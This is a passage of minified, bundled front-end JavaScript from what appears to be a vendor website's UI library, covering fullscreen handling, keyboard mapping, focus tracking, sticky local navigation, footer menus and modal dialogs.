r=parseInt(getComputedStyle(this._playerContainer).maxWidth.replace("px","")),o=r/e,a=s?parseInt(getComputedStyle(this._player.el).maxHeight.replace("px","")):o;let i=parseInt(getComputedStyle(this._player.el).margin.replace("px",""));(o>n||a&&o>a)&&(r=(a||n)*e-2*i,o=Math.min(r/e,n)),(r>t||r>o*e)&&(r=(o=Math.min(t/e,n))*e),i&&(o=(r-=2*i)/e),this._mediaElement.style.width=r+"px",this._mediaElement.style.height=Math.min(o,n)+"px"}else this._mediaElement.style.width="",this._mediaElement.style.height="";i>e&&!this._isFullScreen?this._playerContainer.parentElement.classList.add("center-horizontal"):this._playerContainer.parentElement.classList.remove("center-horizontal"),this._player.refreshSize()},t.exports=a},{"@marcom/feature-detect/touchAvailable":430,"@marcom/useragent-detect":435}],145:[function(e,t,n){"use strict";var i=!1;window.addEventListener("load",(function(){i=!0})),t.exports=function(e){i?e():window.addEventListener("load",e)}},{}],146:[function(e,t,n){"use strict";var i=e("./internal/CheckboxMenu"),r={className:"footer"};function o(e,t){t=Object.assign({},r,t),this.el=e,this._selectors={wrapper:"."+t.className,directory:t.directorySelector||"."+t.className+"-directory",mini:t.miniSelector||"."+t.className+"-mini"},this._initializeDirectory(),this._initializeLangLink()}var s=o.prototype;s._initializeDirectory=function(){if(this._directory=this.el.querySelector(this._selectors.directory),this._directory)for(var e,t,n,r=this._directory.querySelectorAll(this._selectors.directory+"-column-section-state"),o=0;o<r.length;o++)t=(e=r[o].nextElementSibling).querySelector(this._selectors.directory+"-column-section-anchor-open"),n=e.querySelector(this._selectors.directory+"-column-section-anchor-close"),i.create(r[o],t,n)},s._initializeLangLink=function(){var e,t,n;this._langLink=this.el.querySelector(this._selectors.mini+"-locale-lang"),this._langLink&&(e=window.location.pathname,t=this._langLink.getAttribute("data-locale-current"),n=this._langLink.pathname,-1!==e.indexOf(t)&&("/"!==(e=e.replace(t,n)).charAt(0)&&(e="/"+e),this._langLink.href=e))},t.exports=o},{"./internal/CheckboxMenu":147}],147:[function(e,t,n){"use strict";function i(e,t,n){this.el=e,this.anchorOpen=t,this.anchorClose=n,this._lastOpen=this.el.checked,this.el.addEventListener("change",this.update.bind(this)),this.anchorOpen.addEventListener("click",this._anchorOpenClick.bind(this)),this.anchorClose.addEventListener("click",this._anchorCloseClick.bind(this)),window.location.hash==="#"+e.id&&(window.location.hash="")}i.create=function(e,t,n){return new i(e,t,n)};var r=i.prototype;r.update=function(){var e=this.isOpen();e!==this._lastOpen&&(this._lastOpen=e)},r.isOpen=function(){return this.el.checked},r.toggle=function(){this.isOpen()?this.close():this.open()},r.open=function(){this.el.checked||(this.el.checked=!0,this.update())},r.close=function(){this.el.checked&&(this.el.checked=!1,this.update())},r._anchorOpenClick=function(e){e.preventDefault(),this.open(),this.anchorClose.focus()},r._anchorCloseClick=function(e){e.preventDefault(),this.close(),this.anchorOpen.focus()},t.exports=i},{}],148:[function(e,t,n){"use strict";t.exports=e("./fullscreen")},{"./fullscreen":154}],149:[function(e,t,n){t.exports={STANDARD:"standard",IOS:"ios"}},{}],150:[function(e,t,n){"use strict";var i=e("@marcom/ac-dom-events/addEventListener"),r=e("@marcom/ac-event-emitter-micro").EventEmitterMicro,o=e("./../events/types"),s=e("./../consts/modes"),a=new r;i(document,"fullscreenchange",(function(e){a.fullscreenElement()?function(e){a.trigger(o.ENTERFULLSCREEN,e)}(e):function(e){a.trigger(o.EXITFULLSCREEN,e)}(e)})),a.fullscreenEnabled=function(e){return!!(document.fullscreenEnabled||document.webkitFullscreenEnabled||document.mozFullScreenEnabled||document.msFullscreenEnabled)},a.fullscreenElement=function(){return document.fullscreenElement||document.webkitFullscreenElement||document.mozFullScreenElement||document.msFullscreenElement||document.webkitCurrentFullScreenElement},a.exitFullscreen=function(e){var t;e&&"function"==typeof e.webkitExitFullscreen?e.webkitExitFullscreen():"function"==typeof document.exitFullscreen?t="exitFullscreen":"function"==typeof document.webkitExitFullscreen?t="webkitExitFullscreen":"function"==typeof document.webkitCancelFullScreen?t="webkitCancelFullScreen":"function"==typeof document.mozCancelFullScreen?t="mozCancelFullScreen":"function"==typeof document.msExitFullscreen&&(t="msExitFullscreen"),"function"==typeof document[t]&&document[t].call(document)},a.requestFullscreen=function(e){var t;"function"==typeof e.requestFullscreen?t="requestFullscreen":"function"==typeof e.webkitRequestFullscreen?t="webkitRequestFullscreen":"function"==typeof e.webkitRequestFullScreen?t="webkitRequestFullScreen":"function"==typeof e.mozRequestFullScreen?t="mozRequestFullScreen":"function"==typeof e.msRequestFullscreen&&(t="msRequestFullscreen"),"function"==typeof e[t]&&e[t].call(e)},a.mode=s.STANDARD,t.exports=a},{"./../consts/modes":149,"./../events/types":153,"@marcom/ac-dom-events/addEventListener":73,"@marcom/ac-event-emitter-micro":122}],151:[function(e,t,n){"use strict";var i=e("./ios"),r=e("./desktop");t.exports={create:function(){var e=r;return"webkitEnterFullscreen"in document.createElement("video")&&!("webkitRequestFullScreen"in document.createElement("div"))&&(e=i),e}}},{"./desktop":150,"./ios":152}],152:[function(e,t,n){"use strict";var i,r=e("@marcom/ac-dom-events/addEventListener"),o=e("@marcom/ac-event-emitter-micro").EventEmitterMicro,s=e("./../events/types"),a=e("./../consts/modes");r(document,"webkitbeginfullscreen",(function(e){c.trigger(s.ENTERFULLSCREEN,e)}),!0),r(document,"webkitendfullscreen",(function(e){i=void 0,c.trigger(s.EXITFULLSCREEN,e)}),!0);var c=new o;c.fullscreenEnabled=function(e){return!!e.webkitSupportsFullscreen},c.fullscreenElement=function(){return i},c.exitFullscreen=function(e){e&&"function"==typeof e.webkitExitFullscreen&&e.webkitExitFullscreen()},c.requestFullscreen=function(e){"function"==typeof e.webkitEnterFullscreen&&e.webkitEnterFullscreen()},c.mode=a.IOS,t.exports=c},{"./../consts/modes":149,"./../events/types":153,"@marcom/ac-dom-events/addEventListener":73,"@marcom/ac-event-emitter-micro":122}],153:[function(e,t,n){t.exports={ENTERFULLSCREEN:"enterfullscreen",EXITFULLSCREEN:"exitfullscreen"}},{}],154:[function(e,t,n){"use strict";e("@marcom/ac-event-emitter-micro").EventEmitterMicro;var i=e("./delegate/factory").create();function r(){throw new Error("Error: Element missing. ac-fullscreen requires an element to be specified")}var o={requestFullscreen:function(e){return e||r(),i.requestFullscreen(e)},fullscreenEnabled:function(e){return e||r(),i.fullscreenEnabled(e)},fullscreenElement:function(){return i.fullscreenElement()},exitFullscreen:function(e){return e||r(),i.exitFullscreen(e)},getMode:function(){return i.mode},on:function(){return i.on.apply(i,arguments)},off:function(){return i.off.apply(i,arguments)},once:function(){return i.once.apply(i,arguments)}};t.exports=o},{"./delegate/factory":151,"@marcom/ac-event-emitter-micro":122}],155:[function(e,t,n){"use strict";t.exports=function(e){var t;return function(){return void 0===t&&(t=e.apply(this,arguments)),t}}},{}],156:[function(e,t,n){"use strict";t.exports=function(e,t){var n=null;return function(){null===n&&(e.apply(this,arguments),n=setTimeout((function(){n=null}),t))}}},{}],157:[function(e,t,n){"use strict";var i=function(e,t){this._target=e,this._tests={},this.addTests(t)},r=i.prototype;r.addTests=function(e){this._tests=Object.assign(this._tests,e)},r._supports=function(e){return void 0!==this._tests[e]&&("function"==typeof this._tests[e]&&(this._tests[e]=this._tests[e]()),this._tests[e])},r._addClass=function(e,t){t=t||"no-",this._supports(e)?this._target.classList.add(e):this._target.classList.add(t+e)},r.htmlClass=function(){var e;for(e in this._target.classList.remove("no-js"),this._target.classList.add("js"),this._tests)this._tests.hasOwnProperty(e)&&this._addClass(e)},t.exports=i},{}],158:[function(e,t,n){"use strict";var i="touch";function r(e,t){this._target=e||document.body,this._attr=t||"data-focus-method",this._focusMethod=this._lastFocusMethod=!1,this._onKeyDown=this._onKeyDown.bind(this),this._onMouseDown=this._onMouseDown.bind(this),this._onTouchStart=this._onTouchStart.bind(this),this._onFocus=this._onFocus.bind(this),this._onBlur=this._onBlur.bind(this),this._onWindowBlur=this._onWindowBlur.bind(this),this._bindEvents()}var o=r.prototype;o._bindEvents=function(){this._target.addEventListener("keydown",this._onKeyDown,!0),this._target.addEventListener("mousedown",this._onMouseDown,!0),this._target.addEventListener("touchstart",this._onTouchStart,!0),this._target.addEventListener("focus",this._onFocus,!0),this._target.addEventListener("blur",this._onBlur,!0),window.addEventListener("blur",this._onWindowBlur)},o._onKeyDown=function(e){this._focusMethod="key"},o._onMouseDown=function(e){this._focusMethod!==i&&(this._focusMethod="mouse")},o._onTouchStart=function(e){this._focusMethod=i},o._onFocus=function(e){this._focusMethod||(this._focusMethod=this._lastFocusMethod),e.target.setAttribute(this._attr,this._focusMethod),this._lastFocusMethod=this._focusMethod,this._focusMethod=!1},o._onBlur=function(e){e.target.removeAttribute(this._attr)},o._onWindowBlur=function(e){this._focusMethod=!1},t.exports=r},{}],159:[function(e,t,n){"use strict";e("@marcom/ac-polyfills");var i=e("./FeatureDetect"),r=e("./defaultTests");t.exports=new i(document.documentElement,r),t.exports.FeatureDetect=i;var o=e("./FocusManager");document.addEventListener&&document.addEventListener("DOMContentLoaded",(function(){new o}))},{"./FeatureDetect":157,"./FocusManager":158,"./defaultTests":160,"@marcom/ac-polyfills":224}],160:[function(e,t,n){"use strict";var i=e("@marcom/ac-feature/touchAvailable");t.exports={touch:i,"progressive-image":!0}},{"@marcom/ac-feature/touchAvailable":131}],161:[function(e,t,n){"use strict";var i=e("@marcom/ac-event-emitter-micro").EventEmitterMicro,r=e("@marcom/ac-dom-events/utils/addEventListener"),o=e("@marcom/ac-dom-events/utils/removeEventListener"),s=e("@marcom/ac-object/create"),a=e("@marcom/ac-keyboard/internal/KeyEvent"),c="keydown",l="keyup";function u(){this._keysDown={},this._DOMKeyDown=this._DOMKeyDown.bind(this),this._DOMKeyUp=this._DOMKeyUp.bind(this),r(document,c,this._DOMKeyDown,!0),r(document,l,this._DOMKeyUp,!0),i.call(this)}var h=u.prototype=s(i.prototype);h.onDown=function(e,t){return this.on("keydown:"+e,t)},h.onceDown=function(e,t){return this.once("keydown:"+e,t)},h.offDown=function(e,t){return this.off("keydown:"+e,t)},h.onUp=function(e,t){return this.on("keyup:"+e,t)},h.onceUp=function(e,t){return this.once("keyup:"+e,t)},h.offUp=function(e,t){return this.off("keyup:"+e,t)},h.isDown=function(e){return e+="",this._keysDown[e]||!1},h.isUp=function(e){return!this.isDown(e)},h.destroy=function(){return this._keysDown=null,o(document,c,this._DOMKeyDown),o(document,l,this._DOMKeyUp),i.prototype.destroy.call(this),this},h._DOMKeyDown=function(e){var t=this._normalizeKeyboardEvent(e),n=t.keyCode+="";this._trackKeyDown(n),this.trigger("keydown:"+n,t)},h._DOMKeyUp=function(e){var t=this._normalizeKeyboardEvent(e),n=t.keyCode+="";this._trackKeyUp(n),this.trigger("keyup:"+n,t)},h._normalizeKeyboardEvent=function(e){return new a(e)},h._trackKeyUp=function(e){this._keysDown[e]&&(this._keysDown[e]=!1)},h._trackKeyDown=function(e){this._keysDown[e]||(this._keysDown[e]=!0)},t.exports=u},{"@marcom/ac-dom-events/utils/addEventListener":82,"@marcom/ac-dom-events/utils/removeEventListener":84,"@marcom/ac-event-emitter-micro":122,"@marcom/ac-keyboard/internal/KeyEvent":163,"@marcom/ac-object/create":185}],162:[function(e,t,n){"use strict";var i=e("./Keyboard");t.exports=new i},{"./Keyboard":161}],163:[function(e,t,n){var i=["keyLocation"];function r(e){var t;for(t in this.originalEvent=e,e)-1===i.indexOf(t)&&"function"!=typeof e[t]&&(this[t]=e[t]);this.location=void 0!==this.originalEvent.location?this.originalEvent.location:this.originalEvent.keyLocation}r.prototype={preventDefault:function(){if("function"==typeof this.originalEvent.preventDefault)return this.originalEvent.preventDefault();this.originalEvent.returnValue=!1},stopPropagation:function(){return this.originalEvent.stopPropagation()}},t.exports=r},{}],164:[function(e,t,n){"use strict";t.exports={BACKSPACE:8,TAB:9,ENTER:13,SHIFT:16,CONTROL:17,ALT:18,COMMAND:91,CAPSLOCK:20,ESCAPE:27,PAGE_UP:33,PAGE_DOWN:34,END:35,HOME:36,ARROW_LEFT:37,ARROW_UP:38,ARROW_RIGHT:39,ARROW_DOWN:40,DELETE:46,ZERO:48,ONE:49,TWO:50,THREE:51,FOUR:52,FIVE:53,SIX:54,SEVEN:55,EIGHT:56,NINE:57,A:65,B:66,C:67,D:68,E:69,F:70,G:71,H:72,I:73,J:74,K:75,L:76,M:77,N:78,O:79,P:80,Q:81,R:82,S:83,T:84,U:85,V:86,W:87,X:88,Y:89,Z:90,NUMPAD_ZERO:96,NUMPAD_ONE:97,NUMPAD_TWO:98,NUMPAD_THREE:99,NUMPAD_FOUR:100,NUMPAD_FIVE:101,NUMPAD_SIX:102,NUMPAD_SEVEN:103,NUMPAD_EIGHT:104,NUMPAD_NINE:105,NUMPAD_ASTERISK:106,NUMPAD_PLUS:107,NUMPAD_DASH:109,NUMPAD_DOT:110,NUMPAD_SLASH:111,NUMPAD_EQUALS:187,TICK:192,LEFT_BRACKET:219,RIGHT_BRACKET:221,BACKSLASH:220,SEMICOLON:186,APOSTRAPHE:222,APOSTROPHE:222,SPACEBAR:32,CLEAR:12,COMMA:188,DOT:190,SLASH:191}},{}],165:[function(e,t,n){"use strict";t.exports=Object.freeze({ELEMENT:1,TEXT:3,COMMENT:8,DOCUMENT:9,DOCUMENT_TYPE:10,DOCUMENT_FRAGMENT:11})},{}],166:[function(e,t,n){"use strict";var i=e("./internal/validate");t.exports=function(e,t){return i.insertNode(e,"insertBefore"),i.childNode(t,"insertBefore"),i.hasParentNode(t,"insertBefore"),t.parentNode.insertBefore(e,t)}},{"./internal/validate":167}],167:[function(e,t,n){"use strict";var i=e("../isNodeType"),r=e("../NODE_TYPES"),o=r.COMMENT,s=r.DOCUMENT_FRAGMENT,a=r.ELEMENT,c=r.TEXT,l=[a,c,o,s],u=[a,c,o],h=[a,s];t.exports={parentNode:function(e,t,n){if(n=n||"target",e&&!i(e,h))throw new TypeError(t+": "+n+" must be an Element, or Document Fragment")},childNode:function(e,t,n){if(n=n||"target",e&&!i(e,u))throw new TypeError(t+": "+n+" must be an Element, TextNode, or Comment")},insertNode:function(e,t,n){if(n=n||"node",e&&!i(e,l))throw new TypeError(t+": "+n+" must be an Element, TextNode, Comment, or Document Fragment")},hasParentNode:function(e,t,n){if(n=n||"target",!e.parentNode)throw new TypeError(t+": "+n+" must have a parentNode")}}},{"../NODE_TYPES":165,"../isNodeType":169}],168:[function(e,t,n){"use strict";t.exports=function(e){return!(!e||!e.nodeType)}},{}],169:[function(e,t,n){"use strict";var i=e("./isNode");t.exports=function(e,t){return!!i(e)&&("number"==typeof t?e.nodeType===t:!!Array.isArray(t)&&-1!==t.indexOf(e.nodeType))}},{"./isNode":168}],170:[function(e,t,n){"use strict";var i=e("@marcom/ac-dom-nodes/isNodeType"),r=e("@marcom/dom-traversal/ancestor"),o=e("@marcom/feature-detect/cssPropertyAvailable"),s=e("@marcom/viewport-emitter/ViewportEmitter"),a=e("@marcom/ac-accessibility/CircularTab"),c=e("./internal/CheckboxMenu"),l=e("./internal/SimpleSticky"),u=e("./internal/ClickAway"),h=e("@marcom/ac-dom-nodes/NODE_TYPES").ELEMENT,d={className:"localnav"},p=function(e,t){var n;t=Object.assign({},d,t),this.el=e,n=t.selector||"."+t.className,this._selectors={traySelector:t.traySelector||"."+t.className+"-menu-tray",viewportEmitterID:t.viewportEmitterID||t.className+"-viewport-emitter",curtainID:t.curtainID||t.className+"-curtain",menuStateID:t.menuStateID||t.className+"-menustate",menuOpeningClassName:t.menuOpeningClassName||t.className+"-opening"},this._selectors.clickAwaySelector=n+", #"+this._selectors.curtainID+", #"+this._selectors.menuStateID,this.tray=this.el.querySelector(this._selectors.traySelector),this.stickyEnabled=this._getStickyEnabled(),this._transitionsAvailable=o("transition"),this._viewports=new s(this._selectors.viewportEmitterID),this.stickyEnabled&&(this._sticky=new l(this.el,t)),this.circTab=new a(this.el),this._initializeMenu()};p.create=function(e,t){return new p(e,t)};var f=p.prototype;f._getStickyEnabled=function(){return this.el.hasAttribute("data-sticky")},f._initializeMenu=function(){var e=document.getElementById(this._selectors.menuStateID),t=document.getElementById(this._selectors.menuStateID+"-open"),n=document.getElementById(this._selectors.menuStateID+"-close"),i="onpopstate"in window?"popstate":"beforeunload";e&&t&&n&&(this.menu=new c(e,t,n),this.menu.on("open",this._onMenuOpen.bind(this)),this.menu.on("close",this._onMenuClose.bind(this)),this._viewports.on("change:viewport",this._onViewportChange.bind(this)),window.addEventListener("scroll",this._onScroll.bind(this)),window.addEventListener("touchmove",this._onScroll.bind(this)),window.addEventListener("keydown",this._onKeyDown.bind(this)),this.tray.addEventListener("click",this._onTrayClick.bind(this)),this._closeMenu=this._closeMenu.bind(this),window.addEventListener(i,this._closeMenu),window.addEventListener("orientationchange",this._closeMenu),new u(this._selectors.clickAwaySelector).on("click",this._closeMenu),this._transitionsAvailable&&this.tray.addEventListener("transitionend",this._enableMenuScroll.bind(this)))},f._onMenuOpen=function(){this._menuCollapseOnScroll=null,this.circTab.start(),this.tray.removeAttribute("aria-hidden","false"),this._transitionsAvailable&&this._disableMenuScrollbar()},f._onMenuClose=function(){this.tray.setAttribute("aria-hidden","true"),this.circTab.stop()},f._onScroll=function(e){var t;this.menu.isOpen()&&(null===this._menuCollapseOnScroll&&(this._menuCollapseOnScroll=this.tray.offsetHeight>=this.tray.scrollHeight),this._menuCollapseOnScroll?(this._closeMenu(),this.menu.anchorOpen.focus()):(t=e.target,i(t,h)&&r(t,this._selectors.traySelector,!0)||(e.preventDefault(),this._menuCollapseOnScroll=!0)))},f._onTrayClick=function(e){"href"in e.target&&this._closeMenu()},f._onKeyDown=function(e){!this.menu.isOpen()||"Escape"!==e.code&&27!==e.keyCode||(this._closeMenu(),this.menu.anchorOpen.focus())},f._onViewportChange=function(e){"medium"!==e.to&&"large"!==e.to||this._closeMenu()},f._disableMenuScrollbar=function(){this.el.classList.add(this._selectors.menuOpeningClassName)},f._enableMenuScroll=function(){this.el.classList.remove(this._selectors.menuOpeningClassName)},f._closeMenu=function(){this.menu.close()},f.destroy=function(){},t.exports=p},{"./internal/CheckboxMenu":171,"./internal/ClickAway":172,"./internal/SimpleSticky":173,"@marcom/ac-accessibility/CircularTab":26,"@marcom/ac-dom-nodes/NODE_TYPES":165,"@marcom/ac-dom-nodes/isNodeType":169,"@marcom/dom-traversal/ancestor":419,"@marcom/feature-detect/cssPropertyAvailable":424,"@marcom/viewport-emitter/ViewportEmitter":445}],171:[function(e,t,n){"use strict";var i=e("@marcom/ac-event-emitter-micro/EventEmitterMicro");function r(e,t,n){i.call(this),this.el=e,this.anchorOpen=t,this.anchorClose=n,this._lastOpen=this.el.checked,this.el.addEventListener("change",this.update.bind(this)),this.anchorOpen.addEventListener("click",this._anchorOpenClick.bind(this)),this.anchorClose.addEventListener("click",this._anchorCloseClick.bind(this)),this.anchorOpen.addEventListener("keydown",this._anchorOpenKeyDown.bind(this)),this.anchorClose.addEventListener("keydown",this._anchorCloseKeyDown.bind(this)),window.location.hash==="#"+e.id&&(window.location.hash="")}r.create=function(e,t,n){return new r(e,t,n)};var o=i.prototype,s=r.prototype=Object.create(o);r.prototype.constructor=r,s.update=function(){var e=this.isOpen();e!==this._lastOpen&&(this.trigger(e?"open":"close"),this._lastOpen=e)},s.isOpen=function(){return this.el.checked},s.toggle=function(){this.isOpen()?this.close():this.open()},s.open=function(){this.el.checked||(this.el.checked=!0,this.update())},s.close=function(){this.el.checked&&(this.el.checked=!1,this.update())},s._anchorOpenClick=function(e){e.preventDefault(),this.open(),this.anchorClose.focus()},s._anchorCloseClick=function(e){e.preventDefault(),this.close(),this.anchorOpen.focus()},s._anchorOpenKeyDown=function(e){"Space"!==e.code&&32!==e.keyCode||this._anchorOpenClick(e)},s._anchorCloseKeyDown=function(e){"Space"!==e.code&&32!==e.keyCode||this._anchorCloseClick(e)},t.exports=r},{"@marcom/ac-event-emitter-micro/EventEmitterMicro":123}],172:[function(e,t,n){"use strict";var i=e("@marcom/ac-event-emitter-micro/EventEmitterMicro"),r=e("@marcom/dom-traversal/ancestors");function o(e){i.call(this),this._selector=e,this._touching=!1,document.addEventListener("click",this._onClick.bind(this)),document.addEventListener("touchstart",this._onTouchStart.bind(this)),document.addEventListener("touchend",this._onTouchEnd.bind(this))}var s=i.prototype,a=o.prototype=Object.create(s);o.prototype.constructor=o,a._checkTarget=function(e){var t=e.target;r(t,this._selector,!0).length||this.trigger("click",e)},a._onClick=function(e){this._touching||this._checkTarget(e)},a._onTouchStart=function(e){this._touching=!0,this._checkTarget(e)},a._onTouchEnd=function(){this._touching=!1},t.exports=o},{"@marcom/ac-event-emitter-micro/EventEmitterMicro":123,"@marcom/dom-traversal/ancestors":420}],173:[function(e,t,n){"use strict";var i=e("@marcom/ac-event-emitter-micro").EventEmitterMicro,r=e("@marcom/feature-detect/cssPropertyAvailable"),o=e("@marcom/ac-dom-nodes/insertBefore"),s=e("@marcom/dom-metrics/getScrollPosition"),a=e("@marcom/useragent-detect").browser.edge,c=function(e,t){i.call(this),this.el=e,this.stuck=!1,this._selectors={placeholderID:t.placeholderID||t.className+"-sticky-placeholder",stuckClassName:t.stuckClassName||t.className+"-sticking"},this._createPlaceholder(),this._featureDetection(),this._updatePosition=this._updatePosition.bind(this),this._updatePlaceholderOffset=this._updatePlaceholderOffset.bind(this),window.addEventListener("scroll",this._updatePosition),document.addEventListener("touchmove",this._updatePosition),window.addEventListener("resize",this._updatePlaceholderOffset),window.addEventListener("orientationchange",this._updatePlaceholderOffset),"acStore"in window&&(window.acStore.getStorefront().then(this._updatePlaceholderOffset),window.acStore.on("storefrontChange",this._updatePlaceholderOffset))};c.create=function(e,t){return new c(e,t)};var l=i.prototype,u=c.prototype=Object.create(l);c.prototype.constructor=c,u._featureDetection=function(){var e="css-sticky";r("position","sticky")&&!a||(e="no-"+e),this.el.classList.add(e),this.placeholder.classList.add(e)},u._createPlaceholder=function(){this.placeholder=document.createElement("div"),this.placeholder.id=this._selectors.placeholderID,o(this.placeholder,this.el),this._updatePlaceholderOffset()},u._updatePlaceholderOffset=function(){var e=this.placeholder.offsetTop;(e+=document.documentElement.offsetTop+document.body.offsetTop)!==this._placeholderOffset&&(this._placeholderOffset=e,this._updatePosition())},u._updatePosition=function(){s("y")>this._placeholderOffset?this.stuck||(this.el.classList.add(this._selectors.stuckClassName),this.placeholder.classList.add(this._selectors.stuckClassName),this.stuck=!0,this.trigger("stuck")):this.stuck&&(this.el.classList.remove(this._selectors.stuckClassName),this.placeholder.classList.remove(this._selectors.stuckClassName),this.stuck=!1,this.trigger("unstuck"))},t.exports=c},{"@marcom/ac-dom-nodes/insertBefore":166,"@marcom/ac-event-emitter-micro":122,"@marcom/dom-metrics/getScrollPosition":413,"@marcom/feature-detect/cssPropertyAvailable":424,"@marcom/useragent-detect":435}],174:[function(e,t,n){"use strict";t.exports={Modal:e("./ac-modal-basic/Modal"),Renderer:e("./ac-modal-basic/Renderer"),classNames:e("./ac-modal-basic/classNames"),dataAttributes:e("./ac-modal-basic/dataAttributes")}},{"./ac-modal-basic/Modal":175,"./ac-modal-basic/Renderer":176,"./ac-modal-basic/classNames":177,"./ac-modal-basic/dataAttributes":178}],175:[function(e,t,n){"use strict";var i={addEventListener:e("@marcom/ac-dom-events/addEventListener"),removeEventListener:e("@marcom/ac-dom-events/removeEventListener"),target:e("@marcom/ac-dom-events/target")},r={getScrollX:e("@marcom/ac-dom-metrics/getScrollX"),getScrollY:e("@marcom/ac-dom-metrics/getScrollY")},o={create:e("@marcom/ac-object/create"),defaults:e("@marcom/ac-object/defaults")},s=e("@marcom/ac-keyboard"),a=e("@marcom/ac-keyboard/keyMap"),c=e("@marcom/ac-event-emitter-micro").EventEmitterMicro,l=e("./Renderer"),u={retainScrollPosition:!1};function h(e,t){c.call(this),this.options=o.defaults(u,e),this.renderer=new l(t),this.opened=!1,this._keysToClose=[a.ESCAPE],this._attachedKeysToClose=[],this.close=this.close.bind(this)}var d=h.prototype=o.create(c.prototype);d.open=function(){this.options.retainScrollPosition&&this._saveScrollPosition(),this.opened||(this._attachEvents(),this.trigger("willopen"),this.renderer.open(),this.opened=!0,this.trigger("open"))},d.close=function(e){var t,n;if(this.opened){if(e&&"click"===e.type&&(t=i.target(e),n=this.renderer.options.dataAttributes.close,!t.hasAttribute(n)))return;this.trigger("willclose"),this._removeEvents(),this.renderer.close(),this.options.retainScrollPosition&&this._restoreScrollPosition(),this.opened=!1,this.trigger("close")}},d.render=function(){this.renderer.render()},d.appendContent=function(e,t){this.renderer.appendContent(e,t)},d.removeContent=function(e){this.renderer.removeContent(e)},d.destroy=function(){for(var e in this._removeEvents(),this.renderer.destroy(),this)this.hasOwnProperty(e)&&(this[e]=null)},d.addKeyToClose=function(e){-1===this._keysToClose.indexOf(e)&&(this._keysToClose.push(e),this._bindKeyToClose(e))},d.removeKeyToClose=function(e){var t=this._keysToClose.indexOf(e);-1!==t&&this._keysToClose.splice(t,1),this._releaseKeyToClose(e)},d._bindKeyToClose=function(e){-1===this._attachedKeysToClose.indexOf(e)&&(s.onUp(e,this.close),this._attachedKeysToClose.push(e))},d._releaseKeyToClose=function(e){var t=this._attachedKeysToClose.indexOf(e);-1!==t&&(s.offUp(e,this.close),this._attachedKeysToClose.splice(t,1))},d._removeEvents=function(){this.renderer.modalElement&&i.removeEventListener(this.renderer.modalElement,"click",this.close),this._keysToClose.forEach(this._releaseKeyToClose,this)},d._attachEvents=function(){this.renderer.modalElement&&i.addEventListener(this.renderer.modalElement,"click",this.close),this._keysToClose.forEach(this._bindKeyToClose,this)},d._restoreScrollPosition=function(){window.scrollTo(this._scrollX||0,this._scrollY||0)},d._saveScrollPosition=function(){this._scrollX=r.getScrollX(),this._scrollY=r.getScrollY()},t.exports=h},{"./Renderer":176,"@marcom/ac-dom-events/addEventListener":73,"@marcom/ac-dom-events/removeEventListener":77,"@marcom/ac-dom-events/target":81,"@marcom/ac-dom-metrics/getScrollX":85,"@marcom/ac-dom-metrics/getScrollY":86,"@marcom/ac-event-emitter-micro":122,"@marcom/ac-keyboard":162,"@marcom/ac-keyboard/keyMap":164,"@marcom/ac-object/create":185,"@marcom/ac-object/defaults":186}],176:[function(e,t,n){"use strict";var i={add:e("@marcom/ac-classlist/add"),remove:e("@marcom/ac-classlist/remove")},r={defaults:e("@marcom/ac-object/defaults")},o={remove:e("@marcom/ac-dom-nodes/remove"),isElement:e("@marcom/ac-dom-nodes/isElement")},s={modalElement:null,contentElement:null,closeButton:null,classNames:e("./classNames"),dataAttributes:e("./dataAttributes")},a=function(e){e=e||{},this.options=r.defaults(s,e),this.options.classNames=r.defaults(s.classNames,e.classNames),this.options.dataAttributes=r.defaults(s.dataAttributes,e.dataAttributes),this.modalElement=this.options.modalElement,this.contentElement=this.options.contentElement,this.closeButton=this.options.closeButton},c=a.prototype;c.render=function(){return o.isElement(this.modalElement)||(this.modalElement=this.renderModalElement(this.options.classNames.modalElement)),o.isElement(this.contentElement)||(this.contentElement=this.renderContentElement(this.options.classNames.contentElement)),!1!==this.closeButton&&(o.isElement(this.closeButton)||(this.closeButton=this.renderCloseButton(this.options.classNames.closeButton)),this.modalElement.appendChild(this.closeButton)),this.modalElement.appendChild(this.contentElement),document.body.appendChild(this.modalElement),this.modalElement},c.renderCloseButton=function(e){var t;return e=e||this.options.classNames.closeButton,(t=this._renderElement("button",e)).setAttribute(this.options.dataAttributes.close,""),t},c.renderModalElement=function(e){return e=e||this.options.classNames.modalElement,this._renderElement("div",e)},c.renderContentElement=function(e){return e=e||this.options.classNames.contentElement,this._renderElement("div",e)},c.appendContent=function(e,t){o.isElement(e)&&(void 0===arguments[1]?this.contentElement.appendChild(e):o.isElement(t)&&t.appendChild(e))},c.removeContent=function(e){e?this.modalElement.contains(e)&&o.remove(e):this._emptyContent()},c.open=function(){var e=[document.documentElement].concat(this.options.classNames.documentElement),t=[this.modalElement].concat(this.options.classNames.modalOpen);i.add.apply(null,e),i.add.apply(null,t)},c.close=function(){var e=[document.documentElement].concat(this.options.classNames.documentElement),t=[this.modalElement].concat(this.options.classNames.modalOpen);i.remove.apply(null,e),i.remove.apply(null,t)},c.destroy=function(){var e=[document.documentElement].concat(this.options.classNames.documentElement);for(var t in this.modalElement&&document.body.contains(this.modalElement)&&(this.close(),document.body.removeChild(this.modalElement)),i.remove.apply(null,e),this)this.hasOwnProperty(t)&&(this[t]=null)},c._renderElement=function(e,t){var n=document.createElement(e),r=[n];return t&&(r=r.concat(t)),i.add.apply(null,r),n},c._emptyContent=function(){this.contentElement.innerHTML=""},t.exports=a},{"./classNames":177,"./dataAttributes":178,"@marcom/ac-classlist/add":56,"@marcom/ac-classlist/remove":64,"@marcom/ac-dom-nodes/isElement":96,"@marcom/ac-dom-nodes/remove":98,"@marcom/ac-object/defaults":186}],177:[function(e,t,n){"use strict";t.exports={modalElement:"modal",modalOpen:"modal-open",documentElement:"has-modal",contentElement:"modal-content",closeButton:"modal-close"}},{}],178:[function(e,t,n){"use strict";t.exports={close:"data-modal-close"}},{}],179:[function(e,t,n){"use strict";t.exports={Modal:e("./ac-modal/Modal"),createStandardModal:e("./ac-modal/factory/createStandardModal"),createFullViewportModal:e("./ac-modal/factory/createFullViewportModal")}},{"./ac-modal/Modal":180,"./ac-modal/factory/createFullViewportModal":181,"./ac-modal/factory/createStandardModal":182}],180:[function(e,t,n){"use strict";var i=e("@marcom/ac-modal-basic").Modal,r=e("@marcom/ac-event-emitter-micro").EventEmitterMicro,o=e("@marcom/ac-accessibility/CircularTab");function s(e){r.call(this),this.options=e||{},this._modal=new 